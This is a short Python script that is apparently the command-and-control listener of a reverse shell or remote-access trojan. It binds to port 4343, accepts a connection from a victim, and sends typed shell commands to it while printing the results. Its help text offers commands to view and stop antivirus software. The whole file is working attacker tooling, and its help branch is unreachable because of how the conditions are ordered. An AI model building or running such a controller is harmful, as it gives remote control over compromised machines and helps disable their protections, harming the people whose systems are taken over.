import socket

host = '0.0.0.0'
port = 4343

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(1)
while True:
    try:
        conn, address = s.accept()
        print(f"Connecting {address}")
        user = conn.recv(1024).decode()
        while True:
            try:
                cmd = input(f"{user}@{address[0]}# ")
                if len(cmd) > 0:
                    conn.send(cmd.encode())
                    data = conn.recv(1024).decode()
                    print(data)
                elif cmd == 'help':
                    print("Help:\n"
                          "view_av\t\tView Antivirus\n"
                          "stop_av\t\tStop Antivirus\n")

            except Exception as e:
                print(f"Error: Aqui {e}")
                break
    except Exception as e:
        print(f"Error: {e}")
        conn.close()
